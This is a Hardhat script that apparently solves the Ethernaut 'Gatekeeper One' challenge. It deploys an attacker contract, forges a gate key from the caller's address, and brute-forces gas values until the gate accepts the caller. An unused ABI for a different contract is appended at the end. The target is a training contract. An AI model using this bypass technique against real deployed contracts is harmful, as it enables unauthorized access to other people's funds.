// Runtime Environment's members available in the global scope.
import { ethers } from 'hardhat';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { createLevel, submitLevel } from './utils';


async function main() {
  const signer = getSigner();
  const level = await createLevel(signer, "gatekeeper one");
  const Gater = await ethers.getContractFactory("GatekeeperOne");
  const gate = await Gater.connect(signer).attach(level);
  await gate.deployed();
  // await gate.reset();
  console.log("current holder:", await gate.entrant());


  const Attacker = await ethers.getContractFactory("GateOneAttacker");
  const attacker = await Attacker.connect(signer).deploy(level);
  await attacker.deployed();


  const addressOwner = await signer.getAddress();
  // first 4 bytes can be anything. next 2 bytes must be diff. last 2 bytes is the end of address
  const hexData = "0x12345678" + "0000" + addressOwner.substring(addressOwner.length - 4, addressOwner.length);
  console.log("bytes data for cracker:",hexData);
  let loopRange =200;
  loopRange = 2000;
  for (let i = 0; i < 50; i++) {
    const tx = await attacker.brute(loopRange ,
      {
        gasLimit: 15000000
      });
    
    await tx.wait();
    const newHolder = await gate.entrant();
    if(newHolder == addressOwner) break;
    console.log("current holder:", newHolder);
    console.log("count:", await attacker.count());
  }

  console.log("current holder:", await gate.entrant());
  console.log("final gas used:", await attacker.finalGasPrice()); // 49342
  await submitLevel(signer, level);

}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

const abi = [
  {
    "inputs": [
      {
        "internalType": "bytes32[3]",
        "name": "_data",
        "type": "bytes32[3]"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ID",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xb3cea217"
  },
  {
    "inputs": [],
    "name": "locked",
    "outputs": [
      {
        "internalType": "bool",
        "name": "",
        "type": "bool"
      }
    ],
    "stateMutability": "view",
    "type": "function",
    "constant": true,
    "signature": "0xcf309012"
  },
  {
    "inputs": [
      {
        "internalType": "bytes16",
        "name": "_key",
        "type": "bytes16"
      }
    ],
    "name": "unlock",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
    "signature": "0xe1afb08c"
  }
]